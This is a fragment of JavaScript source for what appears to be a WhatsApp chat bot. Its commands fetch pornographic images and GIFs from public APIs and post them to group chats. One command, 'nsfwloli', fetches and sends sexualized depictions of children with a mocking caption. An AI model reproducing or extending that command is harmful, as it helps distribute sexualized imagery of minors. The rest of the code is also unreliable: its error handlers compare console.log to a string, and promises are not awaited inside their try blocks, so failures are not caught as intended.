case 'solog':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/solog`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'lewdk':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/lewdk`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

//GIF
case 'ngif':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/ngif`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'blowjob':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/blowjob`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'hentai':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/hentai`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'hololewd':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/hololewd`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'trap':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/trap`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'les':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/les`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'smallboobs':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/smallboobs`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'futanari':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/futanari`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'femdom':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/femdom`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'feed':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/feed`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case'erok':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/erok`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case'feetg':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/feetg`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case'erokemo':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/erokemo`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case'boobs':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
res = axios.get(`https://nekos.life/api/v2/img/boobs`).then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
if(console.log == "marker was not found")
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'nsfwloli':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
loli.getNSFWLoli(async (err, res) => {
if (err) return reply('❌an error occurred❌\n\nPlease try again. ')
buffer = await getBuffer(res.url)
tiringa.sendMessage(from, buffer, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: 'Seu lolicon safado😔'})
})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error occurred❌\n\nPlease try again. ')
}
break
                  
case 'pussy':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
axios.get('https://nekos.life/api/v2/img/pussy_jpg').then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} catch (e) {
e = String(e)
if (!e.includes("marker was not found")) {
reply(ptbr.erro())
} 
}
break
                       
//GIF
case 'cumgif':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
axios.get('https://nekos.life/api/v2/img/cum').then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
a = webp2gifFile(buf)
mp4 = getBuffer(a.result)
tiringa.sendMessage(from, mp4, MessageType.video, {mimetype: 'video/gif', filename: `stick.gif`, thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: '✅'})
})
})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error occurred❌\n\nPlease try again. ')
}
break
              
//GIF
case 'bjgif':
res = await fetchJson('https://nekos.life/api/v2/img/bj')
ggf = await getBuffer(res.url)
sendMediaURL(from, ggf, 'a')
break  
      
//GIF
case 'nsfwgif':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
axios.get('https://nekos.life/api/v2/img/nsfw_neko_gif').then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.video, {mimetype: 'video/gif', filename: `stick.gif`, thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: '✅'})
})
})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error occurred❌\n\nPlease try again. ')
}
break
                
//GIF
case 'slap':
axios.get('https://nekos.life/api/v2/img/slap').then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
break
                
//GIF
case 'rhug':
axios.get('https://nekos.life/api/v2/img/hug').then(res => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
break
case 'ephemeral':   
					
					if (!isGroup) return reply(ptbr.groupo())
					 
                teks = args.join(' ')
                sksks = body.slice(11)
                options = {
                sendEphemeral: true, 
               thumbnail: await imageToBase64(ppgc)
                }
              await tiringa.sendMessage(from, `${sksks}`, text, options, { contextInfo: { forwardingScore: 508, isForwarded: true}})
break
case 'tits':
try {
msgFilter.isFiltered(from)
if (!isNsfw) return reply(ptbr.nsfw())
reply(ptbr.waitsfw())
if(args[0] === "1") {
var tits =  axios.get('https://meme-api.herokuapp.com/gimme/tits').then((res) => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} else if(args[0] === "2") {
var tits =  axios.get('https://meme-api.herokuapp.com/gimme/BestTits').then((res) => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} else if(args[0] === "3") {
var tits =  axios.get('https://meme-api.herokuapp.com/gimme/boobs').then((res) => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} else if(args[0] === "4") {
var tits =  axios.get('https://meme-api.herokuapp.com/gimme/BiggerThanYouThought').then((res) => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} else if(args[0] === "6") {
var tits =  axios.get('https://meme-api.herokuapp.com/gimme/smallboobs').then((res) => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} else if(args[0] === "7") {
var tits =  axios.get('https://meme-api.herokuapp.com/gimme/TinyTits').then((res) => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} else if(args[0] === "8") {
var tits =  axios.get('https://meme-api.herokuapp.com/gimme/SmallTitsHugeLoad').then((res) => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} else if(args[0] === "9") {
var tits =  axios.get('https://meme-api.herokuapp.com/gimme/amazingtits').then((res) => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
} else {
var tits =  axios.get('https://meme-api.herokuapp.com/gimme/tits').then((res) => {
imageToBase64(res.data.url)
.then(
(ress) => {
var buf = Buffer.from(ress, 'base64')
tiringa.sendMessage(from, buf, MessageType.image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
})
})
}
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error occurred❌\n\nPlease try again. ')
}
break
//_ FIM DOS COMANDOS NSFW

default:
                           }
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}

})
}
starts()
